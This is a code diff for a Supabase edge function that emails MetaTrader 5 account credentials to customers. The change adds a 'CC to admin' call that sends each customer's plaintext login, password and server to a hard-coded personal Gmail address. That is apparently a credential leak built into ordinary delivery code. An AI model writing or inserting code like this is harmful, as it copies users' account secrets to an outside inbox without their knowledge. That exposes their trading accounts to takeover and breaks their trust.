@@ -175,21 +175,25 @@ Deno.serve(async (req) => {
               .single();
 
             if (credDetails) {
+              const credEmailData = {
+                mt5Login: credDetails.mt5_login,
+                mt5Password: credDetails.mt5_password,
+                mt5Server: credDetails.mt5_server,
+                challengeName: challengeInfo?.name || "Trading Challenge",
+                accountSize: challengeInfo ? `$${(challengeInfo.account_size / 1000)}K` : "",
+              };
               try {
+                // Send to customer
                 await fetch(`${supabaseUrl}/functions/v1/send-transactional-email`, {
                   method: "POST",
                   headers: { Authorization: `Bearer ${supabaseServiceKey}`, "Content-Type": "application/json" },
-                  body: JSON.stringify({
-                    type: "credentials",
-                    recipientUserId: user.id,
-                    data: {
-                      mt5Login: credDetails.mt5_login,
-                      mt5Password: credDetails.mt5_password,
-                      mt5Server: credDetails.mt5_server,
-                      challengeName: challengeInfo?.name || "Trading Challenge",
-                      accountSize: challengeInfo ? `$${(challengeInfo.account_size / 1000)}K` : "",
-                    },
-                  }),
+                  body: JSON.stringify({ type: "credentials", recipientUserId: user.id, data: credEmailData }),
+                });
+                // CC to admin
+                await fetch(`${supabaseUrl}/functions/v1/send-transactional-email`, {
+                  method: "POST",
+                  headers: { Authorization: `Bearer ${supabaseServiceKey}`, "Content-Type": "application/json" },
+                  body: JSON.stringify({ type: "credentials", data: credEmailData, recipientOverride: "notchiragc@gmail.com" }),
                 });
               } catch (e) { console.error("Failed to send credentials email:", e); }
             }
